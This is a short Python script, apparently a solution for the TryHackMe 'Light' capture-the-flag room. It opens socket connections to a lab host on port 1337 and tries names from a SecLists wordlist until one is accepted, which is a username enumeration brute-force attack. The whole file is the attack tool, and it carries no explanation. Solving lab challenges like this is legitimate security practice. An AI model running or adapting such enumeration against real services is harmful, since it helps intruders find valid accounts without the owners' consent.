# CTF - light - TryHackMe

import socket

IP = "10.10.3.130"  
PORTA = 1337
WORDLIST = "/usr/share/wordlists/seclists/Usernames/Names/names.txt" 

def testar_usuario(usuario):
    try:
        cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        cliente.settimeout(2)  
        cliente.connect((IP, PORTA))

        cliente.recv(1024).decode()

        cliente.sendall(usuario.encode() + b"\n")

        resposta = cliente.recv(1024).decode().strip()

        cliente.close()

        resposta = resposta.replace("Please enter your username:", "").strip()

        return resposta if resposta else "not found"

    except Exception as e:
        print(f"[ERRO] Não foi possível conectar ao servidor: {e}")
        return None

with open(WORDLIST, "r") as arquivo:
    for linha in arquivo:
        nome = linha.strip()
        resposta = testar_usuario(nome)

        if resposta is None:
            break  

        print(f"Testando: {nome} | Resposta: {resposta}")

        if "not found" in resposta.lower():
            continue

        print(f"[✅] Nome encontrado: {nome}")
        break
